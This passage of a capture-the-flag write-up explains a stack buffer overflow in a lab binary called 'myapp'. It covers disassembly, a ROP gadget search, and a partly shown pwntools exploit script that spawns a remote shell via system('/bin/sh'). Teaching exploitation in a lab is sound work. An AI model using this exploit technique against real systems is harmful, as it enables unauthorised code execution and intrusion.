+                &nbsp;&nbsp;401160: 48&nbsp;89&nbsp;e5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;rbp,rsp<br>
+                &nbsp;&nbsp;401163: 48&nbsp;83&nbsp;ec&nbsp;70&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sub&nbsp;&nbsp;&nbsp;&nbsp;rsp,0x70<br>
+                &nbsp;&nbsp;401167: 48&nbsp;8d&nbsp;3d&nbsp;9a&nbsp;0e&nbsp;00&nbsp;00&nbsp; lea&nbsp;&nbsp;&nbsp;&nbsp;rdi,[rip+0xe9a]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;402008&nbsp;&lt;_IO_stdin_used+0x8&gt;<br>
+                &nbsp;&nbsp;40116e: e8&nbsp;cd&nbsp;fe&nbsp;ff&nbsp;ff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp;&nbsp;401040&nbsp;&lt;system@plt&gt;<br>
+                &nbsp;&nbsp;401173: 48&nbsp;8d&nbsp;3d&nbsp;9e&nbsp;0e&nbsp;00&nbsp;00&nbsp; lea&nbsp;&nbsp;&nbsp;&nbsp;rdi,[rip+0xe9e]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;402018&nbsp;&lt;_IO_stdin_used+0x18&gt;<br>
+                &nbsp;&nbsp;40117a: b8&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;eax,0x0<br>
+                &nbsp;&nbsp;40117f: e8&nbsp;cc&nbsp;fe&nbsp;ff&nbsp;ff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp;&nbsp;401050&nbsp;&lt;printf@plt&gt;<br>
+                &nbsp;&nbsp;401184: 48&nbsp;8d&nbsp;45&nbsp;90&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lea&nbsp;&nbsp;&nbsp;&nbsp;rax,[rbp-0x70]<br>
+                &nbsp;&nbsp;401188: be&nbsp;e8&nbsp;03&nbsp;00&nbsp;00&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;esi,0x3e8<br>
+                &nbsp;&nbsp;40118d: 48&nbsp;89&nbsp;c7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;rdi,rax<br>
+                &nbsp;&nbsp;401190: b8&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;eax,0x0<br>
+                &nbsp;&nbsp;401195: e8&nbsp;c6&nbsp;fe&nbsp;ff&nbsp;ff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp;&nbsp;401060&nbsp;&lt;gets@plt&gt;<br>
+                &nbsp;&nbsp;40119a: 48&nbsp;8d&nbsp;45&nbsp;90&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lea&nbsp;&nbsp;&nbsp;&nbsp;rax,[rbp-0x70]<br>
+                &nbsp;&nbsp;40119e: 48&nbsp;89&nbsp;c7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;rdi,rax<br>
+                &nbsp;&nbsp;4011a1: e8&nbsp;8a&nbsp;fe&nbsp;ff&nbsp;ff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp;&nbsp;401030&nbsp;&lt;puts@plt&gt;<br>
+                &nbsp;&nbsp;4011a6: b8&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;eax,0x0<br>
+                &nbsp;&nbsp;4011ab: c9&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; leave&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;4011ac: c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ret&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;4011ad: 0f&nbsp;1f&nbsp;00&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; nop&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;PTR&nbsp;[rax]
+            </div>
+        </div><br>
+        <br>
+        Even if you can't read assembly, using what you know from running the binary, you might be able to guess what the <code>main()</code> function is doing by reading its calls.<br>
+        <br>
+        • <code>call 401040</code> <strong><code>&lt;</code></strong><code>system@plt&gt;</code> prints the uptime of the machine<br>
+        • <code>call 401050 &lt;printf@plt&gt;</code> prints out <code>What do you want me to echo back?</code><br>
+        • <code>call 401060 &lt;gets@plt&gt;</code> prompts the user for input<br>
+        • And <code>call 401030 &lt;puts@plt&gt;</code> prints out the user's input to the screen<br>
+        <br>
+        The interesting function in the disassembly of <code>myapp</code> is <code>test</code>.<br>
+        <code>test</code> never gets called by <code>main</code>, which was suspicious to me.<br>
+        <br>
+        <a id="h2-6" name="h2-6"></a><strong></strong>
+        <h2><strong>6) How to exploit myapp?</strong></h2><br>
+        If you can read assembly comfortably (I can't), <code>test</code>'s instructions will stand out to you as the key to exploiting this binary.<br>
+        <br>
+        <strong>system()</strong><br>
+        With <code>system()</code> imported into the binary, the goal is to run <code>system("/bin/sh")</code> and spawn a shell.<br>
+        There's no <code>/bin/sh</code> string available in <code>myapp</code>, so you have to write/create your own <code>/bin/sh</code> string.<br>
+        <br>
+        <strong>How to use system()?</strong><br>
+        The <code>system()</code> function takes, as a parameter, a <strong>pointer</strong> to a string that it will run as a command.<br>
+        It will not take a string/hex values itself.<br>
+        <br>
+        <strong>About 64-bit Calling Conventions</strong><br>
+        On 32-bit machines, parameters for functions are placed onto the stack.<br>
+        On 64-bit machines, parameters for functions are placed into registers.<br>
+        <br>
+        The order of the registers is like this - <code>RDI</code>, <code>RSI</code>, <code>RDX</code>, <code>RCX</code>, etc.<br>
+        The 1st parameter goes into <code>RDI</code>, the 2nd parameter in <code>RSI</code>, 3rd parameter... etc.<br>
+        <br>
+        <strong>Calling system() on 64-bit Machines</strong><br>
+        To call <code>system()</code> on a 64-bit machine, you need to write a <strong>pointer</strong> to the string/command you want to run into <code>RDI</code>.<br>
+        For this exploit, you want to spawn a shell.<br>
+        Therefore, you'll want to pop a pointer to a <code>/bin/sh</code> string into <code>RDI</code>.<br>
+        When <code>system()</code> is called, it will read the string pointed to by <code>RDI</code> (/bin/sh) and run <code>system("/bin/sh")</code>.<br>
+        <br>
+        You can write a pointer to a <code>/bin/sh</code> string using the instructions in the <code>test</code> function.<br>
+        <br>
+        <a id="h3-8" name="h3-8"></a><strong></strong>
+        <h3><strong>6a) Write /bin/sh to stack</strong></h3><br>
+        <br>
+        <strong>Local Variables and the Stack</strong><br>
+        Based on the assembly code, C pseudo-code for the <code>main()</code> function in the <code>myapp</code> binary probably looks like this.<br>
+            <div class="codebox">
+                <span style="color:#7f0044;font-weight:400">int</span>&nbsp;main()&nbsp;{<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;user_input[<span style="color:#ff0044;font-weight:400">112</span>];<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;system(<span style="color:#3ad900;font-weight:400">"/bin/uptime"</span>);<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;printf(<span style="color:#3ad900;font-weight:400">"What&nbsp;do&nbsp;you&nbsp;want&nbsp;me&nbsp;to&nbsp;echo&nbsp;back"</span>?);<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;gets(user_input);<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;puts(user_input);<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;<span style="color:#ff0044;font-weight:400">0</span>;<br>
+                }
+            </div>
+        </div><br>
+        <br>
+        <code>gets()</code> takes input from the user and copies it into a variable.<br>
+        In the code above, <code>gets()</code> copies the user input into a 112 byte variable called <code>user_input</code>.<br>
+        <br>
+        Functions with local variables reserve space on the stack for their variables.<br>
+        Because <code>main()</code> has a local variable - <code>user_input</code> - it reserves space on the stack to store it.<br>
+        <br>
+        You can see this at the start of the assembly code for <code>main</code> in the <code>myapp</code> binary:<br>
+            <div class="codebox">
+                000000000040115f&nbsp;&lt;main&gt;:<br>
+                &nbsp;&nbsp;40115f:&nbsp;55&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;rbp<br>
+                &nbsp;&nbsp;401160:&nbsp;48&nbsp;89&nbsp;e5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;rbp,rsp<br>
+                &nbsp;&nbsp;401163:&nbsp;48&nbsp;83&nbsp;ec&nbsp;70&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub&nbsp;&nbsp;&nbsp;&nbsp;rsp,0x70
+            </div>
+        </div><br>
+        <br>
+        0x70 is 112 in decimal.<br>
+        RSP points to the top of the stack.<br>
+        <code>sub rsp,0x70</code> takes 112 from RSP, which decreases the stack pointer by 112.<br>
+        This reserves space on the stack to store the user input from <code>gets()</code>.<br>
+        <br>
+        <strong>Write /bin/sh to the stack</strong><br>
+        When you're prompted for user input - <code>“What do you want to echo back?"</code> - and overflow the buffer with 120 <code>A</code>s, those <code>A</code>s get written to the stack.<br>
+        Instead of writing <code>A</code>s, you could write <code>/bin/sh\x00</code> (followed by <code>A</code>s to fill the buffer).<br>
+        <code>\x00</code> is NULL-byte, used to signify the end of the string.<br>
+        <br>
+        By providing <code>/bin/sh\x00</code> at user input, you'll have a <code>/bin/sh</code> string on the stack to work with.<br>
+        <br>
+        <a id="h3-9" name="h3-9"></a><strong></strong>
+        <h3><strong>6b) Use test function</strong></h3><br>
+        <code>/bin/sh\x00</code> is 8 bytes long.<br>
+        At user input, you write 112 bytes of <code>A</code>s followed by <code>/bin/sh\x00</code> to reach the RIP overwrite.<br>
+            <div class="codebox">
+                payload&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>*<span style="color:#ff0044;font-weight:400">112</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;offset&nbsp;to&nbsp;RIP&nbsp;at&nbsp;120&nbsp;bytes</span><br>
+                payload&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"/bin/sh\x00"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;rbp&nbsp;points&nbsp;here</span>
+            </div>
+        </div><br>
+        <br>
+        The stack looks like this:<br>
+        _________________<br>
+        | |<br>
+        | |<br>
+        | |<br>
+        | |<br>
+        | |<br>
+        | |<br>
+        | | main()'s Local Variable <code>user_input</code><br>
+        | user_input | � 112 bytes large<br>
+        | |<br>
+        | |<br>
+        | |<br>
+        | |<br>
+        | |<br>
+        | |<br>
+        | |<br>
+        |________________|<br>
+        | RBP | stack base - RBP points here<br>
+        | _______________| � 8 bytes large<br>
+        | ret address |<br>
+        |________________| � overwrite main()'s return address to control RIP<br>
+        <br>
+        The <code>user_input</code> buffer is only 112 bytes long.<br>
+        You fill <code>user_input</code> with 112 <code>A</code>s, and then with the 8 bytes of <code>/bin/sh\x00</code> overwrite RBP.<br>
+        The RBP register, which points the base of the stack, will now point to your <code>/bin/sh\x00</code> string.<br>
+        <code>RBP = /bin/sh\x00</code><br>
+        <br>
+        <strong>test</strong><br>
+        With <code>/bin/sh</code> on the stack, you can use the instructions in the <code>test</code> function to write a pointer to your <code>/bin/sh</code> string into <code>RDI</code>.<br>
+        You need a pointer to <code>/bin/sh</code> in RDI for when you call <code>system()</code>, so that you can run <code>system("/bin/sh")</code>.<br>
+        <br>
+        ***Assembly Notes***:<br>
+        RBP currently points to your <code>/bin/sh\x00</code> string on the stack.<br>
+        RSP is a register that points the top of the stack.<br>
+        <code>push &lt;register&gt;</code> pushes data inside <code>&lt;register&gt;</code> onto the top of the stack.<br>
+        <code>mov &lt;register B&gt; &lt;register A&gt;</code> moves data from register A into register B.<br>
+        <br>
+            <div class="codebox">
+                #0000000000401152&nbsp;&lt;test&gt;:<br>
+                #&nbsp;&nbsp;401152: 55&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp;rbp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;push&nbsp;rbp&nbsp;(/bin/sh)&nbsp;to&nbsp;top&nbsp;of&nbsp;stack<br>
+                #&nbsp;&nbsp;401153: 48&nbsp;89&nbsp;e5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;rbp,rsp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;move&nbsp;rsp&nbsp;(/bin/sh)&nbsp;into&nbsp;rbp<br>
+                #&nbsp;&nbsp;401156: 48&nbsp;89&nbsp;e7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;rdi,rsp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;move&nbsp;rsp&nbsp;(/bin/sh)&nbsp;into&nbsp;rdi<br>
+                #&nbsp;&nbsp;401159: 41&nbsp;ff&nbsp;e5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp&nbsp;&nbsp;&nbsp;&nbsp;r13&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;jump&nbsp;to&nbsp;code&nbsp;in&nbsp;r13<br>
+                #&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        • <code>push rbp</code> will push your <code>/bin/sh</code> string pointed to by <code>RBP</code> onto the top of the stack<br>
+        ◇ <code>RSP</code> now points to your <code>/bin/sh</code> string because it's at the top of the stack<br>
+        • <code>mov rbp, rsp</code> moves the data in <code>RSP</code> (which points to /bin/sh) into <code>RBP</code><br>
+        • <code>mov rdi, rsp</code> will move the data in <code>RSP</code> (/bin/sh) into <code>RDI</code> (the register we need set-up to call system())<br>
+        ◇ There is now a pointer to your <code>/bin/sh</code> string in <code>RDI</code><br>
+        • <code>jmp r13</code> will jump to the address in <code>r13</code> and run the code there<br>
+        <br>
+        The python exploit script looks like this so far:<br>
+            <div class="codebox">
+                <span style="color:#333333;font-weight:400">from</span>&nbsp;pwn&nbsp;<span style="color:#333333;font-weight:400">import</span>&nbsp;*<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;-------&nbsp;GADGETS&nbsp;-------</span><br>
+                test_addr&nbsp;=&nbsp;p64(<span style="color:#ff0044;font-weight:400">0x00401152</span>)<br>
+                <span style="color:#0088ff;font-weight:400">#0000000000401152&nbsp;&lt;test&gt;:</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;&nbsp;401152: 55&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp;rbp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;push&nbsp;rbp&nbsp;(/bin/sh)&nbsp;to&nbsp;top&nbsp;of&nbsp;stack</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;&nbsp;401153: 48&nbsp;89&nbsp;e5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;rbp,rsp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;move&nbsp;rsp&nbsp;(/bin/sh)&nbsp;into&nbsp;rbp</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;&nbsp;401156: 48&nbsp;89&nbsp;e7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;rdi,rsp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;move&nbsp;rsp&nbsp;(/bin/sh)&nbsp;into&nbsp;rdi</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;&nbsp;401159: 41&nbsp;ff&nbsp;e5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp&nbsp;&nbsp;&nbsp;&nbsp;r13&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;jump&nbsp;to&nbsp;code&nbsp;in&nbsp;r13</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;...</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;-------&nbsp;EXPLOIT&nbsp;-------</span><br>
+                payload&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"/bin/sh\x00"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;rbp&nbsp;points&nbsp;here</span><br>
+                payload&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>*<span style="color:#ff0044;font-weight:400">112</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;offset&nbsp;to&nbsp;RIP&nbsp;at&nbsp;120&nbsp;bytes</span><br>
+                payload&nbsp;+=&nbsp;test_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;overwrite&nbsp;RIP</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;test&nbsp;moves&nbsp;pointer&nbsp;to&nbsp;"/bin/sh"&nbsp;into&nbsp;rdi</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;and&nbsp;jumps&nbsp;to&nbsp;r13</span><br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;payload
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-10" name="h3-10"></a><strong></strong>
+        <h3><strong>6c) jmp r13 system() - ROP</strong></h3><br>
+        The <code>jmp r13</code> in <code>test</code> causes a problem because it will jump to the address pointed to <code>r13</code> and start running code there.<br>
+        You want to run <code>system()</code>, not random code.<br>
+        <br>
+        So that you don't run random code, you can pop the address of <code>system()</code> into <code>r13</code>.<br>
+        The previous instructions willl set up <code>RDI = &lt;pointer /bin/sh string&gt;</code> for you.<br>
+        Because <code>RDI</code> contains a pointer to <code>/bin/sh</code> string, the jump to <code>system()</code> will successfully spawn a shell.<br>
+        <br>
+        <strong>ROP</strong><br>
+        To set up <code>r13</code>, you need to make use of a ROP gadget.<br>
+        <br>
+        ROP stands for Return Oriented Programming.<br>
+        ROP is a technique where you use assembly instructions already present within the program's code that end with a <code>ret</code> instruction - <code>return</code>.<br>
+        <br>
+        For example,<br>
+            <div class="codebox">
+                pop&nbsp;rax;&nbsp;pop&nbsp;rcx;&nbsp;ret
+            </div>
+        </div><br>
+        <br>
+        This ROP gadget will pop a value into RAX, a value into RCX, and then return to the next address on the stack and run code there.<br>
+        <br>
+        The <code>ret</code> instruction is crucial.<br>
+        If the instructions above were simply<br>
+            <div class="codebox">
+                pop&nbsp;rax;&nbsp;pop&nbsp;rcx
+            </div>
+        </div><br>
+        <br>
+        You would overwrite RIP with the address of the gadget above, pop a value into RAX, pop a value into RCX, and then the program would crash.<br>
+        <br>
+        By using sequences of assembly instructions that end in a <code>ret</code>, you can chain assembly code already present in the binary together and run any code you want to.<br>
+        <br>
+        <strong>pop r13 Gadget</strong><br>
+        r13 can't be set up during <code>test</code>, so it needs to have data popped into it beforehand.<br>
+        In that case, you need to find a ROP gadget that will pop data into <code>r13</code>.<br>
+        On the return, you'll move to <code>test</code>.<br>
+        <br>
+        I used <code>ropper</code> to find a <code>pop r13</code> gadget.<br>
+            <div class="codebox">
+                root@city64:~/ctf/safe#&nbsp;ropper&nbsp;--file&nbsp;myapp&nbsp;--search&nbsp;"pop&nbsp;r13"<br>
+                [INFO]&nbsp;Load&nbsp;gadgets&nbsp;from&nbsp;cache<br>
+                [LOAD]&nbsp;loading...&nbsp;100%<br>
+                [LOAD]&nbsp;removing&nbsp;double&nbsp;gadgets...&nbsp;100%<br>
+                [INFO]&nbsp;Searching&nbsp;for&nbsp;gadgets:&nbsp;pop&nbsp;r13<br>
+                <br>
+                [INFO]&nbsp;File:&nbsp;myapp<br>
+                0x0000000000401206:&nbsp;pop&nbsp;r13;&nbsp;pop&nbsp;r14;&nbsp;pop&nbsp;r15;&nbsp;ret;
+            </div>
+        </div><br>
+        <br>
+        There's a <code>pop r13</code> gadget available at <code>0x00401206</code>.<br>
+        <code>pop r14</code> and <code>pop r15</code> are also part of the gadget.<br>
+        These extra instructions don't matter because you don't need <code>r14</code> or r<code>15</code> for anything, so you can simply pop junk data into them until you hit the <code>ret</code> and can return to <code>test</code>.<br>
+        <br>
+        <a id="h2-7" name="h2-7"></a><strong></strong>
+        <h2><strong>7) Write myapp Exploit Script</strong></h2><br>
+        At this point, you have everything you need to exploit <code>myapp</code>. Write your script!<br>
+        <br>
+        <a id="h3-11" name="h3-11"></a><strong></strong>
+        <h3><strong>Exploit Plan</strong></h3><br>
+        1. Write 112 <code>A</code>s followed to <code>/bin/sh\x00</code> to reach the RIP offset<br>
+        2. Overwrite <code>RIP</code> with <code>pop r13</code> gadget<br>
+        1) pop address of system() into r13<br>
+        2) pop junk into r14<br>
+        3) pop junk into r15<br>
+        3. <code>ret</code>urn to <code>test</code> function (which sets up RDI and calls <code>system()</code>, spawning a shell)<br>
+        <br>
+        <a id="h3-12" name="h3-12"></a><strong></strong>
+        <h3><strong>Exploit Script</strong></h3><br>
+        <code>p64</code> is part of pwntools. It'll convert the hex numbers (0xWhatever) into valid 64-bit values.<br>
+        <code>system()</code>'s address was retrieved from <code>rabin2 -i myapp</code>.<br>
+        <code>test()</code>'s address was retrieve from <code>objdump -M intel -d myapp</code><br>
+        <br>
+        <code>r = remote('10.10.10.147', 1337)</code> is part of pwntools. It'll connect to a binary running on a remote host.<br>
+        <code>r.sendline()</code> will send the payload to the binary.<br>
+        <code>r.interactive()</code> spawns an interactive shell and lets you interact with your newly-spawned shell.<br>
+        <br>
+        <strong>exploit.py</strong><br>
+            <div class="codebox">
+                <span style="color:#333333;font-weight:400">from</span>&nbsp;pwn&nbsp;<span style="color:#333333;font-weight:400">import</span>&nbsp;*<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;***NOTE***:&nbsp;exploit&nbsp;wont'&nbsp;work&nbsp;inside&nbsp;of&nbsp;gdb,&nbsp;no&nbsp;idea&nbsp;why</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;it&nbsp;also&nbsp;won't&nbsp;work&nbsp;without&nbsp;pwntools&nbsp;interactive(),&nbsp;no&nbsp;idea&nbsp;why</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;-------&nbsp;GADGETS&nbsp;-------</span><br>
+                pop_r13_14_15_ret&nbsp;=&nbsp;p64(<span style="color:#ff0044;font-weight:400">0x00401206</span>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;r13;&nbsp;pop&nbsp;r14;&nbsp;pop&nbsp;r15;&nbsp;ret;</span><br>
+                system_addr&nbsp;=&nbsp;p64(<span style="color:#ff0044;font-weight:400">0x00401040</span>)<br>
+                test_addr&nbsp;=&nbsp;p64(<span style="color:#ff0044;font-weight:400">0x00401152</span>)<br>
+                <span style="color:#0088ff;font-weight:400">#0000000000401152&nbsp;&lt;test&gt;:</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;&nbsp;401152: 55&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp;rbp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;push&nbsp;rbp&nbsp;(/bin/sh)&nbsp;to&nbsp;top&nbsp;of&nbsp;stack</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;&nbsp;401153: 48&nbsp;89&nbsp;e5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;rbp,rsp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;move&nbsp;rsp&nbsp;(/bin/sh)&nbsp;into&nbsp;rbp</span><br>
